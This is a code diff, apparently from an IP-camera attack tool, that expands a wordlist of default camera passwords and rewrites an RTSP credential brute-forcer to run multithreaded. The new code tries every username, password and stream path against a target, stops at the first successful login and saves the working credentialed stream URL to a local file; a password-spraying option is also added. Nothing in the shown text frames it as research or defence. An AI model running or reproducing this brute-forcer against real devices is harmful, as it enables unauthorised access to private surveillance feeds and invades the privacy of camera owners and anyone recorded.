@@ -11,8 +11,17 @@ import socket
 import re
 import base64
 import os
+import concurrent.futures
+import threading
 from lib.log_cat import LogCat
+from lib.calc_io import calcIO 
+
 log = LogCat()
+best_threads=calcIO().get()
+ 
+
+file_lock = threading.Lock()
+found_lock = threading.Lock()
 
 class CamLib():
     def Hikvision(self):
@@ -130,43 +139,159 @@ class Execute_Cam(CamLib):
     def __init__(self):
         self.__PASSWORD = [
         '123456',
-        'fang12345',
         'admin',
         'password',
         '12345',
         '1234',
         '12345678',
         '123456789',
+        '1234567890',
         '111111',
         '123123',
         '1234567',
-        'qwerty',
-        'abc123',
-        'password1',
-        'root',
-        'admin123',
-        'admin1234',
-        '123321',
-        '888888',
-        'adminadmin',
-        '123',
-        'user',
-        '123qwe',
-        'pass',
-        '123abc',
-        'admin1',
-        'pass123',
-        '123abc123',
-        '1234qwer',
-        'default',
-        'guest',
         '123456a',
         '123abc!',
         '11111111',
-    ]
+        '',
+        '000000',
+        '666666',
+        '88888888',
+        '123456789a',
+        'admin888',
+        'admin123456',
+        '12345678910',
+        'a123456',
+        '123456789abc',
+        'admin000',
+        'root123',
+        'root123456',
+        '12345678a',
+        'admin123!',
+        'admin@123',
+        'admin#123',
+        '123456789!',
+        'password123',
+        'password1234',
+        'password12345',
+        'password123456',
+        'qwerty123',
+        'qwerty1234',
+        'qwerty12345',
+        'qwertyuiop',
+        'asdfgh',
+        'asdfgh123',
+        'zxcvbn',
+        'zxcvbn123',
+        '1qaz2wsx',
+        '1q2w3e4r',
+        '1q2w3e',
+        'qwe123',
+        'qweasd',
+        'qweasd123',
+        'qwertyui',
+        '123qweasd',
+        'qaz123',
+        'wsx123',
+        'edc123',
+        'admin123!@#',
+        'admin@123456',
+        'Admin123',
+        'ADMIN123',
+        'Admin123456',
+        'administrator',
+        'Administrator',
+        'ADMINISTRATOR',
+        '123456admin',
+        'admin123456789',
+        'root123456789',
+        'roottoor',
+        'toor',
+        'fang12345',
+        'passw0rd',
+        'Passw0rd',
+        'PASSWORD',
+        'Password',
+        '00000000',
+        '1111111111',
+        '123456789012',
+        '987654321',
+        '9876543210',
+        '12344321',
+        '112233',
+        '11223344',
+        '121212',
+        '123123123',
+        '12341234',
+        '1234512345',
+        'camera',
+        'Camera',
+        'CAMERA',
+        'security',
+        'Security',
+        'SECURITY',
+        'surveillance',
+        'Surveillance',
+        'ipcam',
+        'IPCam',
+        'IPCAM',
+        'dvr',
+        'DVR',
+        'nvr',
+        'NVR',
+        'system',
+        'System',
+        'SYSTEM',
+        'null',
+        'NULL',
+        'none',
+        'None',
+        'NONE',
+        ]
+        self.found_valid = False
 
-    def run(self, ip: str, port=554):
+    def __check_rtsp_combo(self, ip, port, username, password, path):
+        with found_lock:
+            if self.found_valid:
+                return False
+        auth_str = f"{username}:{password}"
+        b64_auth = base64.b64encode(auth_str.encode()).decode()
+        request = (
+            f"DESCRIBE rtsp://{ip}:{port}/{path} RTSP/1.0\r\n"
+            f"CSeq: 1\r\n"
+            f"Authorization: Basic {b64_auth}\r\n"
+            f"Accept: application/sdp\r\n"
+            f"\r\n"
+        )
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((ip, port))
+            sock.send(request.encode())
+            response = sock.recv(4096).decode(errors='ignore')
+            sock.close()
+
+            if "200 OK" in response:
+                with found_lock:
+                    if self.found_valid:
+                        return False
+                    self.found_valid = True
+                rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/{path}"
+                log.success(f"{rtsp_url}")
+                os.makedirs('./data', exist_ok=True)
+                with file_lock:
+                    with open('./data/ipcam.info', 'a', encoding='utf-8') as f:
+                        f.write(rtsp_url + '\n')
+                return True
+        except Exception:
+            pass
+        return False
+
+    def run(self, ip: str, port=554,password=''):
+        if password:
+            self.__PASSWORD = list(password)
+            log.info(f"Currently entering password spraying : Try Password => [{password}]")
         log.info(f"Current Detection [{ip}:{port}]")
+        log.info(f"Optimal high-speed thread count for current computer automatically calculated: {best_threads}")
         _, banner = self.__get_rtsp_banner(ip, port)
         if banner is None:
             log.warning("Skip...")
@@ -224,8 +349,33 @@ class Execute_Cam(CamLib):
                 users, default_paths = self.Milesight()
             else:
                 log.info("The server-side has hidden the banner and is using default options...")
-            self.__rtsp_path_bruteforce(ip, port, default_paths, users)
-
+            
+            self.found_valid = False
+            combos = [
+                (username, password, path)
+                for username in users
+                for password in self.__PASSWORD
+                for path in default_paths
+            ]
+            with concurrent.futures.ThreadPoolExecutor(max_workers=best_threads) as executor:
+                future_to_combo = {
+                    executor.submit(self.__check_rtsp_combo, ip, port, user, pwd, path): (user, pwd, path)
+                    for user, pwd, path in combos
+                }
+ 
+                for future in tqdm(concurrent.futures.as_completed(future_to_combo), 
+                                   total=len(future_to_combo), 
+                                   desc="Brute Force Progress", 
+                                   unit="combo"):
+      
+                    if self.found_valid:
+                        executor.shutdown(wait=False, cancel_futures=True)
+                        break
+  
+                    try:
+                        future.result()
+                    except Exception:
+                        pass
 
     def __get_rtsp_banner(self, ip: str, port=554):
         try:
@@ -248,40 +398,3 @@ class Execute_Cam(CamLib):
             return (ip, server)
         except Exception as e:
             return (None, None)
-
-
-    def __rtsp_path_bruteforce(self, ip, port, paths, usernames):
-        combos = [
-            (username, password, path)
-            for username in usernames
-            for password in self.__PASSWORD
-            for path in paths
-        ]
-
-        for username, password, path in tqdm(combos, desc="Progress", unit="combo"):
-            auth_str = f"{username}:{password}"
-            b64_auth = base64.b64encode(auth_str.encode()).decode()
-            request = (
-                f"DESCRIBE rtsp://{ip}:{port}/{path} RTSP/1.0\r\n"
-                f"CSeq: 1\r\n"
-                f"Authorization: Basic {b64_auth}\r\n"
-                f"Accept: application/sdp\r\n"
-                f"\r\n"
-            )
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
-                sock.connect((ip, port))
-                sock.send(request.encode())
-                response = sock.recv(4096).decode(errors='ignore')
-                sock.close()
-                if "200 OK" in response:
-                    rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/{path}"
-                    log.success(f"{rtsp_url}")
-                    os.makedirs('./data', exist_ok=True)
-                    with open('./data/ipcam.info', 'a', encoding='utf-8') as f:
-                        f.write(rtsp_url + '\n')
-                    return
-
-            except Exception:
-                return
